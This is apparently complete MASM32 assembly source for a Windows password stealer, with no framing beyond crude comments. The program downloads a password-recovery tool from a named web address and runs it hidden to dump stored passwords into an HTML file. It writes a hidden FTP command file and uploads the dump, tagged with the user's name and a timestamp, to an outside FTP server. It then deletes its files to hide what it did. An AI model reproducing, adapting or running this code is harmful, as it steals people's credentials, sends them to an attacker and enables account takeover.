.386
.model  flat,stdcall
option  casemap:none
include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
include \masm32\include\advapi32.inc
include \masm32\include\masm32.inc
include \masm32\include\urlmon.inc

;|      Libraries:
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\urlmon.lib




.data
dateformat db "yyyyMMdd",0
timeformat db "HHmmss",0
Redir     db "pspv.exe /shtml snagged.html",0
FTPsite   db 'exploit.wox.org',0
FTPstring db 'ftp -n -s:%s %s',0
Passes    db 'snagged.html',0
cmds      db "upload.ftp",0 
passrape  db "pspv.exe",0
user      db "snaged", 0
pass      db "snaged", 0
fmt             db  "user %s %s",0Dh, 0Ah
                db  "put %s %s.%s.%s.html",0Dh, 0Ah
                db  "bye",0
  web db 'http://illmob.org/pspv.exe',0,32 dup(0)
.data?
UserName            db 256 dup(?)
UserNameLen         dd ?
usernamebuff		db 256 dup(?)
sitebuff  			db 128 dup(?)
stm SYSTEMTIME <> 
dtm SYSTEMTIME <> 
tbuffer db 100 dup (0) 
dbuffer db 100 dup (0)
hFile 				dd ?
fwritten 			dd ?
.code
start:
  push 0
  push 0
  push offset passrape
  push offset web
  push 0
  call URLDownloadToFileA
invoke GetLocalTime, addr stm 
invoke GetLocalTime, addr dtm  
invoke GetDateFormat, LOCALE_USER_DEFAULT, NULL,addr dtm,addr dateformat, addr dbuffer, sizeof dbuffer  
invoke GetTimeFormat, LOCALE_USER_DEFAULT,NULL,addr stm, addr timeformat, addr tbuffer, sizeof tbuffer
invoke WinExec,addr Redir, SW_HIDE
invoke Sleep,1000 ; let the passwords fill up
mov     UserNameLen, SIZEOF UserName
invoke  GetUserName, addr UserName, addr UserNameLen
invoke wsprintf,addr usernamebuff,addr fmt,addr user,addr pass,addr Passes,addr UserName,addr dbuffer,addr tbuffer
invoke wsprintf,addr sitebuff,addr FTPstring,addr cmds,addr FTPsite 
    ;create a upload.ftp file that has the ftp cmds in it in it
    invoke CreateFile,ADDR cmds,GENERIC_WRITE,FILE_SHARE_READ,
    0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0
        mov hFile,eax
	invoke lstrlen,ADDR usernamebuff
	invoke WriteFile,hFile,ADDR usernamebuff,eax,ADDR fwritten,0
	invoke CloseHandle,hFile
invoke WinExec, addr sitebuff, SW_HIDE
 invoke Sleep,8000 ;let that shit finish or the delete will fuck it up
 invoke DeleteFile, addr cmds
 invoke DeleteFile, addr Passes
 invoke DeleteFile, addr passrape
 invoke  ExitProcess, eax
end start
